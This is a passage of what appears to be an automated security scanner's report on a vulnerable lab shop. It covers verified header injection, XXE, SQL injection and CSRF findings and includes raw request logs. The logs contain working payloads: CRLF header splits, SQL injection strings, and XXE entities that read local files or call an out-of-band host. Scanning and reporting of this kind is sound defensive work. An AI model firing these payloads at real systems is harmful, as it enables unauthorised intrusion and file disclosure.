      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[OBJECT] — verified**

  the response headers

  - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-00eb0dfb` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-e6ca09b8b8` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1

**[IMPACT] — verified**

  Attacker input reaches a response header (CRLF shape) — header injection into proxies/browsers.

  - `finding` ref `F-e6ca09b8b8` excerpt: `impact grade=proven; chain: re-test:fresh-header-name on GET https://ginandjuice.shop/catalog`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1

</details>


### AP-81b562a680 — VERIFIED — xxe at /catalog/product/stock — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-98386c0986 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | POST https://ginandjuice.shop/catalog/product/stock — parameter productId |
| **action** | verified | an external entity injected into submitted XML is resolved by the parser |
| **object** | verified | the XML entity resolver (local file content reached the response) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: <?xml version) |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | External entity resolution proven (file content reached the response, or an out-of-band fetch arrived from the target's own infrastructure) — local file disclosure and SSRF-via-parser. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-95974851` excerpt: `AWSALB=[REDACTED]`
    REQUEST  POST https://ginandjuice.shop/catalog/product/stock
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "https://webhook.site/[REDACTED]?i=oob-f582348...
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:25:37 GMT
      content-type: text/plain; charset=utf-8
      content-length: 3
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: 998
  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1

**[ENTRY] — verified**

  POST https://ginandjuice.shop/catalog/product/stock — parameter productId

  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
  - `journal` ref `req-31c7bf3b` excerpt: `https://ginandjuice.shop/catalog/product/stock`
    REQUEST  POST https://ginandjuice.shop/catalog/product/stock
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>4</produ...
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:25:29 GMT
      content-type: text/plain; charset=utf-8
      content-length: 3
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: 998

**[ACTION] — verified**

  an external entity injected into submitted XML is resolved by the parser

  - `finding` ref `F-98386c0986` excerpt: `verification: re-test:fresh-interaction-id (passed=True)`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
  - `journal` ref `req-31c7bf3b` excerpt: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-co`
    REQUEST  POST https://ginandjuice.shop/catalog/product/stock
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>4</produ...
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:25:29 GMT
      content-type: text/plain; charset=utf-8
      content-length: 3
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: 998

**[OBJECT] — verified**

  the XML entity resolver (local file content reached the response)

  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: <?xml version)

  - `journal` ref `req-31c7bf3b` excerpt: `AWSALB=[REDACTED]`
    REQUEST  POST https://ginandjuice.shop/catalog/product/stock
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>4</produ...
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:25:29 GMT
      content-type: text/plain; charset=utf-8
      content-length: 3
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: 998
  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-98386c0986` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1

**[IMPACT] — verified**

  External entity resolution proven (file content reached the response, or an out-of-band fetch arrived from the target's own infrastructure) — local file disclosure and SSRF-via-parser.

  - `finding` ref `F-98386c0986` excerpt: `impact grade=proven; chain: re-test:fresh-interaction-id on POST https://ginandjuice.shop/catalog/product/stock`
    finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
      verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1

</details>


### AP-8e7e7cb526 — VERIFIED — sql_injection at /catalog — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-277b70ea40 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | GET https://ginandjuice.shop/catalog — parameter category |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-6fdb342e` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/catalog?category=1+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:23 GMT
      content-type: text/html; charset=utf-8
      content-length: 9383
      connection: keep-alive
      set-cookie: category=1 AND 1=2; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-277b70ea40` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  GET https://ginandjuice.shop/catalog — parameter category

  - `finding` ref `F-277b70ea40` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-040a8c67` excerpt: `https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--`
    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:26 GMT
      content-type: text/html; charset=utf-8
      content-length: 17079
      connection: keep-alive
      set-cookie: category=1' OR 1=1--; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-277b70ea40` excerpt: `verification: oracle:or-bodydiff-2round (passed=True)`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-040a8c67` excerpt: `https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--`
    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:26 GMT
      content-type: text/html; charset=utf-8
      content-length: 17079
      connection: keep-alive
      set-cookie: category=1' OR 1=1--; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[OBJECT] — verified**

  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-277b70ea40` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-040a8c67` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:26 GMT
      content-type: text/html; charset=utf-8
      content-length: 17079
      connection: keep-alive
      set-cookie: category=1' OR 1=1--; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-277b70ea40` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-277b70ea40` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-277b70ea40` excerpt: `impact grade=proven; chain: oracle:or-bodydiff-2round on GET https://ginandjuice.shop/catalog`
    finding: sql_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

</details>


### AP-ac91ec423d — VERIFIED — csrf at /catalog/cart — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-d8bbff4e3e | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | POST https://ginandjuice.shop/catalog/cart — parameter productId, redir, quantity |
| **action** | verified | a state-changing request forged from a hostile origin and accepted |
| **object** | verified | the state-changing operation (twin entity typing: Order) |
| **authorization** | verified | the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation) |
| **state** | verified | the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline) |
| **impact** | verified | A state-changing request from a hostile origin was accepted exactly like a same-origin one (fresh-origin replay) — silent cross-site action forgery against authenticated users. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-19abd81f` excerpt: `AWSALB=[REDACTED]`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: AWSALB=[REDACTED]
      body: productId=4%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:25:45 GMT
      content-type: application/json; charset=utf-8
      content-length: 30
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Invalid parameter: productId"
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

**[ENTRY] — verified**

  POST https://ginandjuice.shop/catalog/cart — parameter productId, redir, quantity

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `https://ginandjuice.shop/catalog/cart`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[ACTION] — verified**

  a state-changing request forged from a hostile origin and accepted

  - `finding` ref `F-d8bbff4e3e` excerpt: `verification: re-test:fresh-hostile-origin (passed=True)`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockC`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[OBJECT] — verified**

  the state-changing operation (twin entity typing: Order)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/`
    twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/

**[AUTHORIZATION] — verified**

  the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

**[STATE] — verified**

  the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `"Missing parameter 'productId'"`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[IMPACT] — verified**

